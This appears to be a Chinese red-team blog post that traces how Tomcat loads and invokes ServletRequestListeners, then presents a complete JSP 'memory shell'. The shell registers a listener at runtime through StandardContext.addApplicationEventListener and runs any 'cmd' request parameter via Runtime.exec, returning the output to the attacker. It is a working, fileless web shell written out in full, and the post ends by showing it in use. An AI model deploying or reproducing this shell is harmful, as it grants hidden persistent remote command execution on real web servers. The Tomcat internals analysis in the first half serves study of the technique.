<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/uhNoRIJHOoHlr2rW53BzTw)

Listener基础
==========

配置Listener
----------

```
package com.naihe2;  
  
import javax.servlet.ServletRequestEvent;  
import javax.servlet.ServletRequestListener;  
  
public class testListener implements ServletRequestListener {  
  
    public void requestDestroyed(ServletRequestEvent sre) {  
        System.out.println("这里是requestDestroyed");  
    }  
  
    public void requestInitialized(ServletRequestEvent sre) {  
        System.out.println("这里是requestInitialized");  
    }  
}  

```

xml配置
-----

```
<?xml version="1.0" encoding="UTF-8"?>  
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"  
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"  
         version="4.0"  
         metadata-complete="false"  
>  
  
    <listener>  
        <listener-class>com.naihe2.testListener</listener-class>  
    </listener>  
  
</web-app>  

```

流程分析
====

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

读取配置文件
------

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

读取web.xml，处理后将信息存储在webXml中

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

配置context  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

直接遍历并添加至addApplication中

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

以上步骤就是将webxml中的listener相关的数据添加到ApplicationListener

接下来直接跟进到listenerStart

获取所有listeners
-------------

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

反射生成了一个testListener对象，及我们自定义的Listener

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

遍历results中的自定义Listener并添加到eventListeners

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

将eventListeners中的内容添加到applicationEventListenersList属性中，而后期tomcat使用Listener会从applicationEventListenersList中取出

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

调用过程
----

在自定义的Listener的requestDestroyed下断点

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

可以发现tomcat会自动调用fireRequestDestroyEvent，因此我们进入fireRequestDestroyEvent

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

这里直接获取applicationEventListenersList属性

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

遍历applicationEventListenersList并强制转为内容为ServletRequestListener类型

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

这里直接调用 requestDestroyed方法

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

对应这自定义的Listener

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

> 接下来如何动态添加Listener 在上面分析，tomcat是将web.xml中的信息取出在调用 addApplication，将信息添加至applicationListeners，然后再由listenerStart反射生成实例化的Listener，并在需要调用前调用fireRequestDestroyEvent，在间接调用 requestDestroyed方法，但是分析了过程我们依旧无法主动添加Listener因为applicationListeners接收的是字符串而非一个对象。不过天无绝人之路，StandardContext提供了另一个方法 addApplicationEventListener，可以直接添加一个Lisener对象到applicationEventListenersList

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

由于ServletRequestEvent至提供了ServletRequest，并没有提供Response，因此需要通过反射获取 Response

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

内存马
===

```
<%@ page contentType="text/html;charset=UTF-8" language="java" %>  
<html>  
<head>  
    <title>Title</title>  
</head>  
<body>  
<%@ page import="org.apache.catalina.core.StandardContext" %>  
<%@ page import="java.lang.reflect.Field" %>  
<%@ page import="org.apache.catalina.connector.Request" %>  
<%@ page import="java.io.InputStream" %>  
<%@ page import="java.util.Scanner" %>  
<%@ page import="java.io.IOException" %>  
<%@ page import="java.io.BufferedInputStream" %>  
<%@ page import="org.apache.catalina.connector.Response" %>  
  
<%!  
    public class DemoListener implements ServletRequestListener{  
  
        public void requestDestroyed(ServletRequestEvent sre) {  
            org.apache.catalina.connector.RequestFacade req = (org.apache.catalina.connector.RequestFacade)sre.getServletRequest();  
            Field requestField = null;  
            try {  
                requestField = Class.forName("org.apache.catalina.connector.RequestFacade").getDeclaredField("request");  
            } catch (NoSuchFieldException e) {  
                e.printStackTrace();  
            } catch (ClassNotFoundException e) {  
                e.printStackTrace();  
            }  
            requestField.setAccessible(true);  
            Request request = null;  
            try {  
                request = (Request) requestField.get(req);  
            } catch (IllegalAccessException e) {  
                e.printStackTrace();  
            }  
            Response response = request.getResponse();  
  
            try {  
                String cmd = request.getParameter("cmd");  
                InputStream is = Runtime.getRuntime().exec(cmd).getInputStream();  
                BufferedInputStream bis = new BufferedInputStream(is);  
                int len;  
                while ((len = bis.read())!=-1){  
                    response.getWriter().write(len);  
                }  
            } catch (IOException e) {  
                e.printStackTrace();  
            }  
  
        }  
        public void requestInitialized(ServletRequestEvent sre) {  
            System.out.println("这里是requestInitialized");  
        }  
    }  
%>  
  
<%  
    Field reqF = request.getClass().getDeclaredField("request");  
    reqF.setAccessible(true);  
    Request req = (Request) reqF.get(request);  
    StandardContext context = (StandardContext) req.getContext();  
    DemoListener listener = new DemoListener();  
    context.addApplicationEventListener(listener);  
%>  
</body>  
</html>  

```

效果展示
====

随便访问一个页面

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

在访问我们的内存马网页 这里我由于代码没有判断cmd是否为空，所以必须输入东西才能正常访问，你懂的

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

再次访问之前不存在的网页

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

往期推荐

[

interceptor内存马详解(文末赠书福利)



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247490338&idx=1&sn=2b077637a82a945a62c7144d25db39e6&chksm=ce64a19ef9132888021fd230b792b4c7bba2698c148b1a4cdd06faebd5f3293a966c4b5bfc90&scene=21#wechat_redirect)

[

Conntroller内存马详解



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247489969&idx=1&sn=28645d16cc43beddc8c46f1cdbce11e7&chksm=ce64a30df9132a1b46cf703bfc2f5a12d4ce835c050e301f46450fe82f3adba1aecd04f27f58&scene=21#wechat_redirect)

[

tomcat通用回显链从0到1



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247489939&idx=1&sn=e36bbcceff74debdfed6171e4e2685fb&chksm=ce64a32ff9132a392e4ce8da521a559e44600fad112f0c79f8186ffc3f728d6b9d30df101273&scene=21#wechat_redirect)

[

Servlet内存马探究



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247489892&idx=1&sn=ce3ea0998720474e8c1d68787dc9f26f&chksm=ce64a3d8f9132ace3be655ab82070b65301d93736716f580d99599de089ce742a637ee761ad3&scene=21#wechat_redirect)

[

从jndi到log4j2



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247489628&idx=1&sn=ec7e5a44477e626864c82308a252128f&chksm=ce64a2e0f9132bf61e84bf4c5a9ce3b5c176ecb351c768b3851cd81c2c2ef0ec40ee076f0998&scene=21#wechat_redirect)

[

shiro从0到1



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247489388&idx=1&sn=d76bbc711e911f96f805f1122fdaea06&chksm=ce64add0f91324c6db3a637c16178df0931e4f0d5cf23704ca95f99e7f2c3f0fedbb1e2d1567&scene=21#wechat_redirect)

[

fastjson从0到1



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247489226&idx=1&sn=042eb6e2022c38e879c865d192e2385d&chksm=ce64ac76f91325602db20e48f485d29a4aea921f4300374c4fa5202ed3f83340f6f82f1afe58&scene=21#wechat_redirect)

[

Java安全之Commons Collections4-7分析



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247489172&idx=1&sn=a2f48139a4437bc5b74e982f6149e6cf&chksm=ce64ac28f913253ea07a8022f08918b9f56d27059a03012f5e7654eaf3d764eaabeaa2e88e01&scene=21#wechat_redirect)

[

Java安全之Commons Collections1-3分析



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247489140&idx=1&sn=9786bcdd660eee8873805287561278cd&chksm=ce64acc8f91325def00d2e553ec347be15c045ef3622cb8307901d7eb6c4267b5306190d6e54&scene=21#wechat_redirect)

[

SQL Server从0到1



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247489102&idx=1&sn=a3b00d4cd9d41f12024a02b1c304e4e5&chksm=ce64acf2f91325e42ea75b178025a70be076b4e8356c73437ea28c54d7cc5f64bbcf262b93c5&scene=21#wechat_redirect)

 ![](http://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6flNJqwg2VJrVbXvO9N2mzz6piagicPIiaCNPGH1tNA1N43RLy5bLY4PyUqNGYocicJMqrusALD0icibkg/0?wx_fmt=png) ** 红队蓝军 ** 一群热爱网络安全的人，知其黑，守其白。不限于红蓝对抗，web，内网，二进制。 43篇原创内容   公众号

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)